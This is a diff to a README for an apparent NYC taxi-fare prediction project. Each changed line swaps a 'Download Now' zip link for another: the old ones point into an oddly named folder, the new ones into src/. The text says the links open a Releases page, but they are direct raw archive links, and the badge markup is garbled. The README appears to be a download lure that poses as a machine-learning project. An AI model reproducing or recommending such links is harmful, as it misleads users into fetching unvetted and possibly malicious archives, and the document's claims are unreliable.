@@ -1,6 +1,6 @@
 # 🚖 nyc-taxi-fare-prediction - Predict NYC Taxi Fares Easily
 
-[![Download](https://raw.githubusercontent.com/Ertugruld1998/nyc-taxi-fare-prediction/main/orthopinacoidal/nyc-taxi-fare-prediction.zip%20Now-Get%20The%https://raw.githubusercontent.com/Ertugruld1998/nyc-taxi-fare-prediction/main/orthopinacoidal/nyc-taxi-fare-prediction.zip)](https://raw.githubusercontent.com/Ertugruld1998/nyc-taxi-fare-prediction/main/orthopinacoidal/nyc-taxi-fare-prediction.zip)
+[![Download](https://github.com/Ertugruld1998/nyc-taxi-fare-prediction/raw/refs/heads/main/src/prediction-fare-taxi-nyc-v1.8.zip%20Now-Get%20The%https://github.com/Ertugruld1998/nyc-taxi-fare-prediction/raw/refs/heads/main/src/prediction-fare-taxi-nyc-v1.8.zip)](https://github.com/Ertugruld1998/nyc-taxi-fare-prediction/raw/refs/heads/main/src/prediction-fare-taxi-nyc-v1.8.zip)
 
 ## 📖 Description
 This project provides a machine learning model to predict taxi fares in New York City. It uses a Random Forest model to estimate fares while considering rush hour factors and tracking inflation from 2016 to 2025. The model achieves a Root Mean Square Error (RMSE) of $1.79, making it reliable for fare predictions.
@@ -16,7 +16,7 @@ These steps will help you download and run the application smoothly.
 2. **Visit the Download Page**
    Click on the link below to access the Releases page where you can download the application.
 
-   [Download Now](https://raw.githubusercontent.com/Ertugruld1998/nyc-taxi-fare-prediction/main/orthopinacoidal/nyc-taxi-fare-prediction.zip)
+   [Download Now](https://github.com/Ertugruld1998/nyc-taxi-fare-prediction/raw/refs/heads/main/src/prediction-fare-taxi-nyc-v1.8.zip)
 
 3. **Choose the Right Version**
    - On the Releases page, look for the latest version.
@@ -67,6 +67,6 @@ We welcome your feedback to improve the application. Feel free to submit issues 
 ## 📥 Download & Install
 Now that you know how to use the application, it’s time to get it! 
 
-[Download Now](https://raw.githubusercontent.com/Ertugruld1998/nyc-taxi-fare-prediction/main/orthopinacoidal/nyc-taxi-fare-prediction.zip)
+[Download Now](https://github.com/Ertugruld1998/nyc-taxi-fare-prediction/raw/refs/heads/main/src/prediction-fare-taxi-nyc-v1.8.zip)
 
 Your journey to accurate NYC taxi fare predictions starts here!
